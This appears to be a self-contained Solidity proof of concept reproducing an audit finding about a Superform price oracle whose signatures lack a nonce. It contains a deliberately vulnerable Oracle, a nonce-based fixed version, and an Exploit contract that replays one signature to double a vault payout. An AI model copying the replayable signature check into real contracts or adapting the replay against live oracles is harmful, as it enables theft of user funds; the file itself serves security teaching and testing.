// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Superform PPS oracle — a price signature has no nonce, so it can be replayed
    (Spearbit, Superform v2 periphery, June 2025).
    SYNTHETIC, cheatcode-free, one block.
    One precomputed signature quotes PPS = 2 ether. The live fair PPS is 1 ether.
    The signature is accepted, a fresh price is posted, and the same signature
    is accepted again. A 100-share redeem then pays 200 ASSET instead of 100.
    The payout is off by N = 100 ASSET. Control folds the nonce into the hash
    and the second submission reverts. */

contract Asset {
    string public constant name = "ASSET";
    string public constant symbol = "ASSET";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Oracle {
    address public immutable signer;
    uint256 public pps;
    uint256 public uses;

    constructor(address signer_) {
        signer = signer_;
        pps = 1 ether;
    }

    function postFresh(uint256 price) external {
        pps = price;
    }

    function update(
        address strategy,
        uint256 price,
        uint256 stdev,
        address validator,
        uint256 totalValidators,
        uint256 timestamp,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        bytes32 messageHash = keccak256(abi.encodePacked(strategy, price, stdev, validator, totalValidators, timestamp));
        bytes32 ethSigned = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash));
        address recovered = ecrecover(ethSigned, v, r, s);
        require(recovered == signer, "signer");
        // @> VULN: nothing consumes a nonce, so this same signature sets the price again
        require(recovered == validator, "validator");
        uses += 1;
        pps = price;
    }
}

contract OracleFixed {
    address public immutable signer;
    uint256 public pps;
    uint256 public nonce;

    constructor(address signer_) {
        signer = signer_;
        pps = 1 ether;
    }

    function postFresh(uint256 price) external {
        pps = price;
    }

    function update(
        address strategy,
        uint256 price,
        uint256 stdev,
        address validator,
        uint256 totalValidators,
        uint256 timestamp,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        bytes32 messageHash =
            keccak256(abi.encodePacked(strategy, price, stdev, validator, totalValidators, timestamp, nonce));
        bytes32 ethSigned = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash));
        address recovered = ecrecover(ethSigned, v, r, s);
        require(recovered == signer, "signer");
        // FIX: the nonce is part of the signed payload and is consumed
        nonce += 1;
        pps = price;
    }
}

contract Vault {
    Asset public asset;
    Oracle public oracle;
    mapping(address => uint256) public shares;

    constructor(Asset asset_, Oracle oracle_) {
        asset = asset_;
        oracle = oracle_;
    }

    function mintShares(address to, uint256 amount) external {
        shares[to] += amount;
    }

    function redeem(address user) external returns (uint256 payout) {
        payout = shares[user] * oracle.pps() / 1 ether;
        asset.transfer(user, payout);
    }
}

contract Exploit {
    address public constant SIGNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address public constant STRATEGY = 0x000000000000000000000000000000000000bEEF;
    uint256 public constant STALE = 2 ether;
    uint256 public constant FAIR = 1 ether;
    uint256 public constant TS = 1_700_000_000;

    uint8 public constant V = 28;
    bytes32 public constant R = 0x8812631a2b776763592cd2e9384cf492554a830277f9ebcd5fdfb419a03134cb;
    bytes32 public constant S = 0x2ad553b27f44a62ad7f9e5394cea41b5566b1aeb7bd20b67946b3991dfce6878;

    Asset public asset;
    Oracle public oracle;
    Vault public vault;
    uint256 public payout;
    uint256 public fairPayout;
    uint256 public offBy;

    constructor() {
        asset = new Asset();
        oracle = new Oracle(SIGNER);
        vault = new Vault(asset, oracle);
    }

    function run() external {
        asset.mint(address(vault), 200 ether);
        vault.mintShares(address(this), 100 ether);
        oracle.update(STRATEGY, STALE, 0, SIGNER, 1, TS, V, R, S);
        oracle.postFresh(FAIR);
        oracle.update(STRATEGY, STALE, 0, SIGNER, 1, TS, V, R, S);
        payout = vault.redeem(address(this));
        fairPayout = 100 ether;
        offBy = payout - fairPayout;
        require(oracle.uses() == 2, "replayed");
        require(oracle.pps() == STALE, "stale");
        require(payout == 200 ether, "paid");
        require(fairPayout == 100 ether, "fair");
        require(offBy == 100 ether, "off by N");
    }
}
